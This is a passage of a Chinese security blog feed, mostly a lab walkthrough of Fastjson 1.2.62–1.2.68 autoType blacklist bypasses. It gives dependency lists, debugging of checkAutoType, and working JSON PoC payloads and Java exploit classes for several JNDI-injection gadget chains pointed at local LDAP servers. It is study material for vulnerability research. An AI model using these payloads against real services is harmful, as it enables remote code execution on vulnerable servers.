alt="image-20230828221211141"><br>另外在AcquisiAction.class.php有代码执行，利用的是eval函数，可以自己跟一下，这个看组长视频没跟了非常绕，并且这个版本也比较老了，等后面来兴趣了我再自己跟吧，这个系统肯定是很多洞的，目前最新版本在41，可以去审一下0day</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>白日梦组长yyds<br><a href="https://www.bilibili.com/video/BV1yq4y1s7h6/?spm_id_from=333.999.0.0&amp;vd_source=fdbccecc8d1a39a2449860e47c52b6e7">https://www.bilibili.com/video/BV1yq4y1s7h6/?spm_id_from=333.999.0.0&amp;vd_source=fdbccecc8d1a39a2449860e47c52b6e7</a></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Fastjson1.2.62-1.2.68绕过</title>
      <link href="/undefined/26817.html"/>
      <url>/undefined/26817.html</url>
      
        <content type="html"><![CDATA[<h2 id="1-2-62漏洞分析"><a href="#1-2-62漏洞分析" class="headerlink" title="1.2.62漏洞分析"></a>1.2.62漏洞分析</h2><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>学的过程发现有些依赖导入真的慢，所以这里直接把整个pom.xml贴出来可以一次性导完算了，看自己选择</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependencies&gt;  </span><br><span class="line">    &lt;dependency&gt;  </span><br><span class="line">        &lt;groupId&gt;com.unboundid&lt;/groupId&gt;  </span><br><span class="line">        &lt;artifactId&gt;unboundid-ldapsdk&lt;/artifactId&gt;  </span><br><span class="line">        &lt;version&gt;<span class="number">4.0</span><span class="number">.9</span>&lt;/version&gt;  </span><br><span class="line">    &lt;/dependency&gt;  </span><br><span class="line">    &lt;dependency&gt;  </span><br><span class="line">        &lt;groupId&gt;commons-io&lt;/groupId&gt;  </span><br><span class="line">        &lt;artifactId&gt;commons-io&lt;/artifactId&gt;  </span><br><span class="line">        &lt;version&gt;<span class="number">2.5</span>&lt;/version&gt;  </span><br><span class="line">    &lt;/dependency&gt;  </span><br><span class="line">    &lt;dependency&gt;  </span><br><span class="line">        &lt;groupId&gt;com.alibaba&lt;/groupId&gt;  </span><br><span class="line">        &lt;artifactId&gt;fastjson&lt;/artifactId&gt;  </span><br><span class="line">        &lt;version&gt;<span class="number">1.2</span><span class="number">.66</span>&lt;/version&gt;  </span><br><span class="line">    &lt;/dependency&gt;  </span><br><span class="line">  </span><br><span class="line">    &lt;dependency&gt;  </span><br><span class="line">        &lt;groupId&gt;org.aspectj&lt;/groupId&gt;  </span><br><span class="line">        &lt;artifactId&gt;aspectjtools&lt;/artifactId&gt;  </span><br><span class="line">        &lt;version&gt;<span class="number">1.9</span><span class="number">.5</span>&lt;/version&gt;  </span><br><span class="line">    &lt;/dependency&gt;  </span><br><span class="line">  </span><br><span class="line">    &lt;dependency&gt;  </span><br><span class="line">        &lt;groupId&gt;com.esotericsoftware&lt;/groupId&gt;  </span><br><span class="line">        &lt;artifactId&gt;kryo&lt;/artifactId&gt;  </span><br><span class="line">        &lt;version&gt;<span class="number">4.0</span><span class="number">.0</span>&lt;/version&gt;  </span><br><span class="line">    &lt;/dependency&gt;  </span><br><span class="line">  </span><br><span class="line">    &lt;dependency&gt;  </span><br><span class="line">        &lt;groupId&gt;com.sleepycat&lt;/groupId&gt;  </span><br><span class="line">        &lt;artifactId&gt;je&lt;/artifactId&gt;  </span><br><span class="line">        &lt;version&gt;<span class="number">5.0</span><span class="number">.73</span>&lt;/version&gt;  </span><br><span class="line">    &lt;/dependency&gt;  </span><br><span class="line">  </span><br><span class="line">    &lt;dependency&gt;  </span><br><span class="line">        &lt;groupId&gt;org.apache.shiro&lt;/groupId&gt;  </span><br><span class="line">        &lt;artifactId&gt;shiro-core&lt;/artifactId&gt;  </span><br><span class="line">        &lt;version&gt;<span class="number">1.12</span><span class="number">.0</span>&lt;/version&gt;  </span><br><span class="line">    &lt;/dependency&gt;  </span><br><span class="line">  </span><br><span class="line">    &lt;dependency&gt;  </span><br><span class="line">        &lt;groupId&gt;br.com.anteros&lt;/groupId&gt;  </span><br><span class="line">        &lt;artifactId&gt;Anteros-Core&lt;/artifactId&gt;  </span><br><span class="line">        &lt;version&gt;<span class="number">1.3</span><span class="number">.6</span>&lt;/version&gt;  </span><br><span class="line">    &lt;/dependency&gt;  </span><br><span class="line">  </span><br><span class="line">    &lt;dependency&gt;  </span><br><span class="line">        &lt;groupId&gt;br.com.anteros&lt;/groupId&gt;  </span><br><span class="line">        &lt;artifactId&gt;Anteros-DBCP&lt;/artifactId&gt;  </span><br><span class="line">        &lt;version&gt;<span class="number">1.0</span><span class="number">.1</span>&lt;/version&gt;  </span><br><span class="line">    &lt;/dependency&gt;  </span><br><span class="line">  </span><br><span class="line">    &lt;dependency&gt;  </span><br><span class="line">        &lt;groupId&gt;com.ibatis&lt;/groupId&gt;  </span><br><span class="line">        &lt;artifactId&gt;ibatis-sqlmap&lt;/artifactId&gt;  </span><br><span class="line">        &lt;version&gt;<span class="number">1.3</span><span class="number">.1</span>&lt;/version&gt;  </span><br><span class="line">    &lt;/dependency&gt;  </span><br><span class="line">  </span><br><span class="line">    &lt;dependency&gt;  </span><br><span class="line">        &lt;groupId&gt;javax.transaction&lt;/groupId&gt;  </span><br><span class="line">        &lt;artifactId&gt;jta&lt;/artifactId&gt;  </span><br><span class="line">        &lt;version&gt;<span class="number">1.1</span>&lt;/version&gt;  </span><br><span class="line">    &lt;/dependency&gt;  </span><br><span class="line">  </span><br><span class="line">    &lt;dependency&gt;  </span><br><span class="line">        &lt;groupId&gt;org.apache.ignite&lt;/groupId&gt;  </span><br><span class="line">        &lt;artifactId&gt;ignite-core&lt;/artifactId&gt;  </span><br><span class="line">        &lt;version&gt;<span class="number">2.15</span><span class="number">.0</span>&lt;/version&gt;  </span><br><span class="line">    &lt;/dependency&gt;  </span><br><span class="line">  </span><br><span class="line">    &lt;dependency&gt;  </span><br><span class="line">        &lt;groupId&gt;org.apache.ignite&lt;/groupId&gt;  </span><br><span class="line">        &lt;artifactId&gt;ignite-jta&lt;/artifactId&gt;  </span><br><span class="line">        &lt;version&gt;<span class="number">2.15</span><span class="number">.0</span>&lt;/version&gt;  </span><br><span class="line">    &lt;/dependency&gt;  </span><br><span class="line">  </span><br><span class="line">    &lt;dependency&gt;  </span><br><span class="line">        &lt;groupId&gt;org.slf4j&lt;/groupId&gt;  </span><br><span class="line">        &lt;artifactId&gt;slf4j-api&lt;/artifactId&gt;  </span><br><span class="line">        &lt;version&gt;<span class="number">2.0</span><span class="number">.7</span>&lt;/version&gt;  </span><br><span class="line">    &lt;/dependency&gt;  </span><br><span class="line">  </span><br><span class="line">    &lt;dependency&gt;  </span><br><span class="line">        &lt;groupId&gt;org.apache.xbean&lt;/groupId&gt;  </span><br><span class="line">        &lt;artifactId&gt;xbean-reflect&lt;/artifactId&gt;  </span><br><span class="line">        &lt;version&gt;<span class="number">4.18</span>&lt;/version&gt;  </span><br><span class="line">    &lt;/dependency&gt;  </span><br><span class="line">    &lt;dependency&gt;  </span><br><span class="line">        &lt;groupId&gt;commons-collections&lt;/groupId&gt;  </span><br><span class="line">        &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;  </span><br><span class="line">        &lt;version&gt;<span class="number">3.2</span><span class="number">.1</span>&lt;/version&gt;  </span><br><span class="line">    &lt;/dependency&gt;  </span><br><span class="line">  </span><br><span class="line">    &lt;dependency&gt;  </span><br><span class="line">        &lt;groupId&gt;commons-codec&lt;/groupId&gt;  </span><br><span class="line">        &lt;artifactId&gt;commons-codec&lt;/artifactId&gt;  </span><br><span class="line">        &lt;version&gt;<span class="number">1.12</span>&lt;/version&gt;  </span><br><span class="line">    &lt;/dependency&gt;  </span><br><span class="line">  </span><br><span class="line">    &lt;dependency&gt;  </span><br><span class="line">        &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;  </span><br><span class="line">        &lt;artifactId&gt;tomcat-dbcp&lt;/artifactId&gt;  </span><br><span class="line">        &lt;version&gt;<span class="number">9.0</span><span class="number">.8</span>&lt;/version&gt;  </span><br><span class="line">    &lt;/dependency&gt;  </span><br><span class="line">  </span><br><span class="line">    &lt;dependency&gt;  </span><br><span class="line">        &lt;groupId&gt;org.mybatis&lt;/groupId&gt;  </span><br><span class="line">        &lt;artifactId&gt;mybatis&lt;/artifactId&gt;  </span><br><span class="line">        &lt;version&gt;<span class="number">3.4</span><span class="number">.4</span>&lt;/version&gt;  </span><br><span class="line">    &lt;/dependency&gt;  </span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure><p>这就是整个fastjson复现所需的依赖了</p><h3 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h3><ul><li>需要开启AutoType；</li><li>Fastjson &lt;&#x3D; 1.2.62；</li><li>JNDI注入利用所受的JDK版本限制；</li><li>目标服务端需要存在xbean-reflect包；xbean-reflect 包的版本不限，我这里把 pom.xml 贴出来。<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;  </span><br><span class="line"> &lt;groupId&gt;com.alibaba&lt;/groupId&gt;  </span><br><span class="line"> &lt;artifactId&gt;fastjson&lt;/artifactId&gt;  </span><br><span class="line"> &lt;version&gt;<span class="number">1.2</span><span class="number">.62</span>&lt;/version&gt;  </span><br><span class="line">&lt;/dependency&gt;  </span><br><span class="line">&lt;dependency&gt;  </span><br><span class="line"> &lt;groupId&gt;org.apache.xbean&lt;/groupId&gt;  </span><br><span class="line"> &lt;artifactId&gt;xbean-reflect&lt;/artifactId&gt;  </span><br><span class="line"> &lt;version&gt;<span class="number">4.18</span>&lt;/version&gt;  </span><br><span class="line">&lt;/dependency&gt;  </span><br><span class="line">&lt;dependency&gt;  </span><br><span class="line"> &lt;groupId&gt;commons-collections&lt;/groupId&gt;  </span><br><span class="line"> &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;  </span><br><span class="line"> &lt;version&gt;<span class="number">3.2</span><span class="number">.1</span>&lt;/version&gt;  </span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure></li></ul><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>这个链子也是黑名单的绕过，所以补丁就不看了直接看漏洞原理<br>这个版本绕过黑民单利用的是<code>org.apache.xbean.propertyeditor.JndiConverter</code> 类的 <code>toObjectImpl()</code> 函数存在 JNDI 注入漏洞，可由其构造函数处触发利用。<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280019803.png" alt="image-20230828001845029"><br>但是<code>toObjectImpl</code>并不是getter或者setter方法，其实这些都在其父类完成在构造函数中调用了父类<code>AbstractConverter</code>的构造函数，而在父类中的一个setter方法即<code>setAsText</code>方法中调用了<code>toObject</code><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280020103.png" alt="image-20230828002015008"><br>继续看<code>toObject</code>方法，里面调用了<code>toObjectImpl</code>方法<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280020929.png" alt="image-20230828002027786"><br>然后看父类的<code>toObjectImpl</code>方法<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280020442.png" alt="image-20230828002039348"><br>是一个抽象方法，意味着只能在其子类中实现，这样就调到了<code>org.apache.xbean.propertyeditor.JndiConverter</code> 类的 <code>toObjectImpl()</code>方法<br>所以exp如下，server端还是用之前的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> bypass;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> org.apache.xbean.propertyeditor.JndiConverter;  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;  </span><br><span class="line"><span class="keyword">import</span> org.apache.xbean.propertyeditor.JndiConverter;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">bypass62</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);  </span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.xbean.propertyeditor.JndiConverter\&quot;,\&quot;AsText\&quot;:\&quot;ldap://127.0.0.1:1099/ExportObject\&quot;&#125;&quot;</span>;  </span><br><span class="line">        JSON.parse(poc);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280020794.png" alt="image-20230828002055319"></p><h3 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h3><p>下面调试看一下，直接在checkAutoType函数下断点来到这里看，在这个版本中又多了一些代码逻辑这里借用一下Drunkbaby佬的代码解释吧</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (typeName == <span class="literal">null</span>) &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">      &#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 限制了JSON中@type指定的类名长度</span></span><br><span class="line">      <span class="keyword">if</span> (typeName.length() &gt;= <span class="number">192</span> || typeName.length() &lt; <span class="number">3</span>) &#123;</span><br><span class="line">          <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">      &#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 单独对expectClass参数进行判断，设置expectClassFlag的值</span></span><br><span class="line"><span class="comment">// 当且仅当expectClass参数不为空且不为Object、Serializable、...等类类型时expectClassFlag才为true</span></span><br><span class="line">      <span class="keyword">final</span> <span class="type">boolean</span> expectClassFlag;</span><br><span class="line">      <span class="keyword">if</span> (expectClass == <span class="literal">null</span>) &#123;</span><br><span class="line">          expectClassFlag = <span class="literal">false</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="keyword">if</span> (expectClass == Object.class</span><br><span class="line">                  || expectClass == Serializable.class</span><br><span class="line">                  || expectClass == Cloneable.class</span><br><span class="line">                  || expectClass == Closeable.class</span><br><span class="line">                  || expectClass == EventListener.class</span><br><span class="line">                  || expectClass == Iterable.class</span><br><span class="line">                  || expectClass == Collection.class</span><br><span class="line">                  ) &#123;</span><br><span class="line">              expectClassFlag = <span class="literal">false</span>;</span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">              expectClassFlag = <span class="literal">true</span>;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line"> </span><br><span class="line">      <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> typeName.replace(<span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">      Class&lt;?&gt; clazz = <span class="literal">null</span>;</span><br><span class="line"> </span><br><span class="line">      <span class="keyword">final</span> <span class="type">long</span> <span class="variable">BASIC</span> <span class="operator">=</span> <span class="number">0xcbf29ce484222325L</span>;</span><br><span class="line">      <span class="keyword">final</span> <span class="type">long</span> <span class="variable">PRIME</span> <span class="operator">=</span> <span class="number">0x100000001b3L</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 1.2.43检测，&quot;[&quot;</span></span><br><span class="line">      <span class="keyword">final</span> <span class="type">long</span> <span class="variable">h1</span> <span class="operator">=</span> (BASIC ^ className.charAt(<span class="number">0</span>)) * PRIME;</span><br><span class="line">      <span class="keyword">if</span> (h1 == <span class="number">0xaf64164c86024f1aL</span>) &#123; <span class="comment">// [</span></span><br><span class="line">          <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">      &#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 1.2.41检测，&quot;Lxx;&quot;</span></span><br><span class="line">      <span class="keyword">if</span> ((h1 ^ className.charAt(className.length() - <span class="number">1</span>)) * PRIME == <span class="number">0x9198507b5af98f0L</span>) &#123;</span><br><span class="line">          <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">      &#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 1.2.42检测，&quot;LL&quot;</span></span><br><span class="line">      <span class="keyword">final</span> <span class="type">long</span> <span class="variable">h3</span> <span class="operator">=</span> (((((BASIC ^ className.charAt(<span class="number">0</span>))</span><br><span class="line">              * PRIME)</span><br><span class="line">              ^ className.charAt(<span class="number">1</span>))</span><br><span class="line">              * PRIME)</span><br><span class="line">              ^ className.charAt(<span class="number">2</span>))</span><br><span class="line">              * PRIME;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 对类名进行Hash计算并查找该值是否在INTERNAL_WHITELIST_HASHCODES即内部白名单中，若在则internalWhite为true</span></span><br><span class="line">      <span class="type">boolean</span> <span class="variable">internalWhite</span> <span class="operator">=</span> Arrays.binarySearch(INTERNAL_WHITELIST_HASHCODES,</span><br><span class="line">              TypeUtils.fnv1a_64(className)</span><br><span class="line">      ) &gt;= <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>然后来到下面这里会进行一个黑白名单检测，这个类都不在所以继续往下<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280021877.png" alt="image-20230828002117567"><br>往下来到了这里进行类加载<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280021288.png" alt="image-20230828002142023"><br>跟进去发现在下面这里拿到了JndiConerter类返回了clazz完成了类加载<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280022741.png" alt="image-20230828002202507"><br>后面就是调用构造方法的过程了不看了<br>这里未开启AutoType为什么不行可以参考下面博客<br><a href="https://johnfrod.top/%e5%ae%89%e5%85%a8/704/">Fastjson反序列化漏洞(4)—1.2.68版本 – JohnFrod’s Blog</a></p><h2 id="1-2-66漏洞分析"><a href="#1-2-66漏洞分析" class="headerlink" title="1.2.66漏洞分析"></a>1.2.66漏洞分析</h2><h3 id="前提条件-1"><a href="#前提条件-1" class="headerlink" title="前提条件"></a>前提条件</h3><ul><li>开启AutoType；</li><li>Fastjson &lt;&#x3D; 1.2.66；</li><li>JNDI注入利用所受的JDK版本限制；</li><li>org.apache.shiro.jndi.JndiObjectFactory类需要shiro-core包；</li><li>br.com.anteros.dbcp.AnterosDBCPConfig 类需要 Anteros-Core和 Anteros-DBCP 包；</li><li>com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig类需要ibatis-sqlmap和jta包；<br>导入maven的包可以在<a href="https://mvnrepository.com/">Maven Repository: Search&#x2F;Browse&#x2F;Explore (mvnrepository.com)</a>直接找</li></ul><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p>新Gadget绕过黑名单限制。</p><p>1.2.66涉及多条Gadget链，原理都是存在JDNI注入漏洞。</p><p>org.apache.shiro.realm.jndi.JndiRealmFactory类PoC：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.shiro.realm.jndi.JndiRealmFactory&quot;</span>, <span class="string">&quot;jndiNames&quot;</span>:[<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>], <span class="string">&quot;Realms&quot;</span>:[<span class="string">&quot;&quot;</span>]&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280022723.png" alt="image-20230828002232239"><br>br.com.anteros.dbcp.AnterosDBCPConfig类PoC：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;</span>,<span class="string">&quot;metricRegistry&quot;</span>:<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>&#125;</span><br><span class="line">或&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;</span>,<span class="string">&quot;healthCheckRegistry&quot;</span>:<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280022084.png" alt="image-20230828002244637"><br>com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig类PoC：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;\<span class="string">&quot;@type\&quot;:\&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig\&quot;,\&quot;properties\&quot;: &#123;\&quot;@type\&quot;:\&quot;java.util.Properties\&quot;,\&quot;UserTransaction\&quot;:\&quot;ldap://127.0.0.1:1099/Exploit\&quot;&#125;&#125;</span></span><br></pre></td></tr></table></figure><p>这条链的这个包没找到这个版本的利用失败<br>各条链的exp如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> bypass;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;  </span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.jndi.JndiObjectFactory;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">bypass66</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);  </span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.shiro.realm.jndi.JndiRealmFactory\&quot;, \&quot;jndiNames\&quot;:[\&quot;ldap://127.0.0.1:1099/Exploit\&quot;],\&quot;Realms\&quot;:[\&quot;\&quot;]&#125;&quot;</span>;  </span><br><span class="line"><span class="comment">//        String poc = &quot;&#123;\&quot;@type\&quot;:\&quot;br.com.anteros.dbcp.AnterosDBCPConfig\&quot;,\&quot;metricRegistry\&quot;:\&quot;ldap://127.0.0.1:1099/Exploit\&quot;&#125;&quot;;  </span></span><br><span class="line"><span class="comment">//        String poc = &quot;&#123;\&quot;@type\&quot;:\&quot;br.com.anteros.dbcp.AnterosDBCPConfig\&quot;,\&quot;healthCheckRegistry\&quot;:\&quot;ldap://127.0.0.1:1099/Exploit\&quot;&#125;&quot;;  </span></span><br><span class="line"><span class="comment">//        String poc = &quot;&#123;\&quot;@type\&quot;:\&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig\&quot;,\&quot;properties\&quot;: &#123;\&quot;@type\&quot;:\&quot;java.util.Properties\&quot;,\&quot;UserTransaction\&quot;:\&quot;ldap://127.0.0.1:1099/Exploit\&quot;&#125;&#125;&quot;;  </span></span><br><span class="line">        JSON.parse(poc);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这几条链子都是利用的jndi打的，也是拿一些新的类绕的黑名单</p><h2 id="1-2-67漏洞分析"><a href="#1-2-67漏洞分析" class="headerlink" title="1.2.67漏洞分析"></a>1.2.67漏洞分析</h2><p>这个也是黑名单绕过，不过用到到了新的东西学习一下</p><h3 id="前提条件-2"><a href="#前提条件-2" class="headerlink" title="前提条件"></a>前提条件</h3><ul><li>开启AutoType；</li><li>Fastjson &lt;&#x3D; 1.2.67；</li><li>JNDI注入利用所受的JDK版本限制；</li><li>org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup类需要ignite-core、ignite-jta和jta依赖；</li><li>org.apache.shiro.jndi.JndiObjectFactory类需要shiro-core和slf4j-api依赖；</li></ul><h3 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>新Gadget绕过黑名单限制。<br>org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup类PoC：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span 